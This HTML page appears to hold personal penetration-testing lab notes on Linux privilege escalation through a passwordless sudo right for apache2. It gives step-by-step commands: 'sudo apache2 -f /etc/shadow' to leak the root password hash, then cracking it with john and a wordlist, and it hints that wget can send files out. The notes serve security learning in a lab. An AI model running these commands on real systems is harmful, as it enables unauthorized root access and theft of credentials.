<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Intended functionality</title>
</head><body>Escilation via intended functionality<br/>
<br/>
Abusing the fact you have sudo to do an intended function.<br/>
<br/>
IE ...<br/>
<br/>
sudo no password priv avilable for apache2. The user likely has some admin tasks.<br/>
<br/>
The sudo priv allows for viewing of protected files. so we can abuse that intended function.<br/>
<br/>
if GTFO des not have an entry. google it<br/>
<br/>
'apache2 sudo privelage escilation'<br/>
<br/>
and look for results.<br/>
<br/>
https://touhidshaikh.com/blog/2018/04/abusing-sudo-linux-privilege-escalation/<br/>
<br/>
<img src="image.png"/><br/>
<br/>
This errors out on line 1 which is enough to get teh root details that can then be extracted and potentailly cracked.<br/>
<br/>
<br/>
We are abusing the an intended fucntion of a sudo privelage.<br/>
<br/>
wget can push!!!<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
Detection<br/>
<br/>
Linux VM<br/>
<br/>
1. In command prompt type: sudo -l<br/>
2. From the output, notice the list of programs that can run via sudo.<br/>
<br/>
Exploitation<br/>
<br/>
Linux VM<br/>
<br/>
1. In command prompt type:<br/>
sudo apache2 -f /etc/shadow<br/>
2. From the output, copy the root hash.<br/>
<br/>
Attacker VM<br/>
<br/>
1. Open command prompt and type:<br/>
echo '[Pasted Root Hash]' &gt; hash.txt<br/>
2. In command prompt type:<br/>
john --wordlist=/usr/share/wordlists/nmap.lst hash.txt<br/>
3. From the output, notice the cracked credentials.<br/>
</body></html>